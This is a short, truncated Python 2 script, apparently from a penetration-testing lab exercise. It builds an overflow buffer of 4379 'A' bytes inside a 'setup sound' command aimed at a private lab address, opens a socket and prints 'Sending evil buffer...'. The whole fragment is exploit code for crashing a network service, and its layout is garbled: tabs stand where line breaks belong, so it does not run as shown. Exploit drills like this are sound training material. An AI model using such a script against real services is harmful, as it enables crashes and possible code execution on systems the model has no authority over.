#!/usr/bin/python	import	socket	
host	=	"10.11.0.128"	
crash	=	"\x41"	*	4379	
buffer	=	"\x11(setup	sound	"	+	crash	+	"\x90\x00#"	
s	=	socket.socket(socket.AF_INET,	socket.SOCK_STREAM)	print	"[*]Sending	evil	buffer..."	
